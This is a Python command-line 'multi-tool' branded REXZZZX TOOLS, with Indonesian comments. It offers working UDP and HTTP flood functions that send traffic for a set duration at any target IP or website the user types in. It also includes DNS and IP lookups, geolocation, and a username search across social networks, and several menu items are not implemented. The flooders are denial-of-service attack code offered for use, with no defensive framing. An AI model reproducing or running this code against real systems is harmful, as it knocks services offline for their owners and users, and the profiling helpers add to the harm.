#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import requests
import threading
import pyfiglet
from tqdm import tqdm
from datetime import datetime
import json
import dns.resolver

# Warna untuk terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class RexzzzxMultiTools:
    def __init__(self):
        self.banner = pyfiglet.figlet_format("REXZZZX TOOLS")
        self.author = f"{Colors.RED}Created by REXZZZX TEAM{Colors.RESET}"
        self.version = f"{Colors.YELLOW}v2.0 (Multi-Feature){Colors.RESET}"
        
    def show_menu(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Colors.CYAN}{self.banner}{Colors.RESET}")
        print(f"{self.author} - {self.version}\n")
        
        print(f"{Colors.BOLD}{Colors.PURPLE}=== NETWORK TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}1. UDP Flood Attack")
        print("2. HTTP Flood Attack")
        print("3. Slow HTTP Attack")
        print("4. Website IP Lookup")
        print("5. Port Scanner")
        print("6. Ping Test")
        
        print(f"\n{Colors.BOLD}{Colors.PURPLE}=== OSINT TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}7. Social Media Lookup")
        print("8. Email Information")
        print("9. IP Geolocation")
        print("10. DNS Lookup")
        
        print(f"\n{Colors.BOLD}{Colors.PURPLE}=== OTHER TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}11. About Tools")
        print(f"{Colors.RED}12. Exit{Colors.RESET}")
        
    def udp_flood(self):
        print(f"\n{Colors.YELLOW}[!] UDP Flood Attack{Colors.RESET}")
        target_ip = input(f"{Colors.BLUE}Enter target IP: {Colors.RESET}")
        target_port = int(input(f"{Colors.BLUE}Enter target port: {Colors.RESET}"))
        duration = int(input(f"{Colors.BLUE}Enter attack duration (seconds): {Colors.RESET}"))
        
        time_end = time.time() + duration
        bytes = random._urandom(1024)
        sent_packets = 0
        
        print(f"\n{Colors.RED}[+] Starting UDP Flood to {target_ip}:{target_port} for {duration} seconds{Colors.RESET}")
        
        try:
            with tqdm(total=duration, desc=f"{Colors.YELLOW}Attacking{Colors.RESET}", unit="s") as pbar:
                while time.time() < time_end:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(bytes, (target_ip, target_port))
                        sent_packets += 1
                        sock.close()
                        pbar.update(1)
                    except:
                        pass
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Attack stopped by user{Colors.RESET}")
            
        print(f"{Colors.GREEN}[+] Attack completed! Sent {sent_packets} packets{Colors.RESET}")
        input("\nPress Enter to continue...")
        
    def http_flood(self):
        print(f"\n{Colors.YELLOW}[!] HTTP Flood Attack{Colors.RESET}")
        target_url = input(f"{Colors.BLUE}Enter target URL (without http://): {Colors.RESET}")
        duration = int(input(f"{Colors.BLUE}Enter attack duration (seconds): {Colors.RESET}"))
        
        time_end = time.time() + duration
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept-Language: en-US,en;q=0.5"
        ]
        sent_requests = 0
        
        print(f"\n{Colors.RED}[+] Starting HTTP Flood to {target_url} for {duration} seconds{Colors.RESET}")
        
        try:
            with tqdm(total=duration, desc=f"{Colors.YELLOW}Attacking{Colors.RESET}", unit="s") as pbar:
                while time.time() < time_end:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        s.connect((socket.gethostbyname(target_url), 80))
                        s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\n{'\\r\\n'.join(headers)}\r\n\r\n".encode())
                        sent_requests += 1
                        s.close()
                        pbar.update(1)
                    except Exception as e:
                        pass
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Attack stopped by user{Colors.RESET}")
            
        print(f"{Colors.GREEN}[+] Attack completed! Sent {sent_requests} requests{Colors.RESET}")
        input("\nPress Enter to continue...")
        
    def website_ip_lookup(self):
        print(f"\n{Colors.YELLOW}[!] Website IP Lookup{Colors.RESET}")
        domain = input(f"{Colors.BLUE}Enter domain (example.com): {Colors.RESET}")
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"\n{Colors.GREEN}[+] IP Address for {domain}: {ip}{Colors.RESET}")
            
            # Get additional DNS info
            print(f"\n{Colors.CYAN}=== Additional DNS Information ==={Colors.RESET}")
            try:
                resolver = dns.resolver.Resolver()
                
                # MX Records
                print(f"\n{Colors.YELLOW}MX Records:{Colors.RESET}")
                mx_records = resolver.resolve(domain, 'MX')
                for record in mx_records:
                    print(f" {record.exchange} (Priority: {record.preference})")
                    
                # NS Records
                print(f"\n{Colors.YELLOW}NS Records:{Colors.RESET}")
                ns_records = resolver.resolve(domain, 'NS')
                for record in ns_records:
                    print(f" {record.target}")
                    
                # TXT Records
                print(f"\n{Colors.YELLOW}TXT Records:{Colors.RESET}")
                try:
                    txt_records = resolver.resolve(domain, 'TXT')
                    for record in txt_records:
                        print(f" {record.strings[0].decode()}")
                except:
                    print(" No TXT records found")
                    
            except Exception as e:
                print(f"{Colors.RED}[-] Could not get additional DNS info: {e}{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
            
        input("\nPress Enter to continue...")
        
    def social_media_lookup(self):
        print(f"\n{Colors.YELLOW}[!] Social Media Lookup{Colors.RESET}")
        username = input(f"{Colors.BLUE}Enter username to search: {Colors.RESET}")
        
        sites = {
            'Facebook': f'https://www.facebook.com/{username}',
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://www.instagram.com/{username}',
            'YouTube': f'https://www.youtube.com/{username}',
            'Reddit': f'https://www.reddit.com/user/{username}',
            'GitHub': f'https://github.com/{username}',
            'TikTok': f'https://www.tiktok.com/@{username}'
        }
        
        print(f"\n{Colors.CYAN}=== Checking Social Media ==={Colors.RESET}")
        
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"{Colors.GREEN}[+] {site}: {url} {Colors.RESET}")
                else:
                    print(f"{Colors.RED}[-] {site}: Not found {Colors.RESET}")
            except:
                print(f"{Colors.RED}[-] {site}: Error checking {Colors.RESET}")
                
        input("\nPress Enter to continue...")
        
    def ip_geolocation(self):
        print(f"\n{Colors.YELLOW}[!] IP Geolocation Lookup{Colors.RESET}")
        ip = input(f"{Colors.BLUE}Enter IP address: {Colors.RESET}")
        
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            data = response.json()
            
            if data['status'] == 'success':
                print(f"\n{Colors.CYAN}=== IP Information ==={Colors.RESET}")
                print(f"{Colors.GREEN}IP: {data['query']}")
                print(f"Country: {data['country']}")
                print(f"Region: {data['regionName']}")
                print(f"City: {data['city']}")
                print(f"ZIP: {data['zip']}")
                print(f"ISP: {data['isp']}")
                print(f"Organization: {data['org']}")
                print(f"AS: {data['as']}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Could not get information for this IP{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
            
        input("\nPress Enter to continue...")
        
    def run(self):
        while True:
            self.show_menu()
            choice = input(f"\n{Colors.BLUE}Select option: {Colors.RESET}")
            
            if choice == "1":
                self.udp_flood()
            elif choice == "2":
                self.http_flood()
            elif choice == "4":
                self.website_ip_lookup()
            elif choice == "7":
                self.social_media_lookup()
            elif choice == "9":
                self.ip_geolocation()
            elif choice == "12":
                print(f"\n{Colors.RED}[+] Exiting REXZZZX TOOLS...{Colors.RESET}")
                sys.exit()
            else:
                print(f"\n{Colors.RED}[!] Invalid option or feature not yet implemented{Colors.RESET}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        tool = RexzzzxMultiTools()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
        sys.exit()
